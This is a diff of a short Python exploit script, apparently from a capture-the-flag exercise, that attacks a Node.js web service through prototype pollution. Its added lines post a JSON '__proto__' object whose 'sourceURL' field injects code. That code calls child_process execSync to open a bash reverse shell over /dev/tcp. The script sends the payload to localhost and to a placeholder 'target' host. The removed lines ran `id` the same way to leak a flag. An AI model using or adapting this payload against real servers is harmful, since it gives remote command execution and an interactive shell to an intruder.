@@ -1,18 +1,21 @@
 import requests
 
-url = 'http://localhost:80/get-data'
-
-headers = {
-    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+url = 'http://localhost:80/'
+headers = {"content-type": "application/json"}
+exp_object = {
+    "__proto__": {
+        "sourceURL" : "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"}
 }
 
-### Dictionary-like value passing
-data = {
-    "__proto__ [asString]": 1,
-    "__proto__ [name]": 2,
-    "__proto__ [inject]": "},flag:process.mainModule.require(`child_process`).execSync(`id`).toString()}}//"
-}
-
-x = requests.post(url, data=data, headers=headers)
+x = requests.post(url, json=exp_object, headers=headers)
 
 print(x.text)
+
+url = 'http://target/'
+headers = {"content-type": "application/json"}
+exp_object = {
+    "__proto__": {
+        "sourceURL" : "\u000areturn e => {return process.mainModule.require\
+        (`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"}
+}
+requests.post(url, json=exp_object, headers=headers)
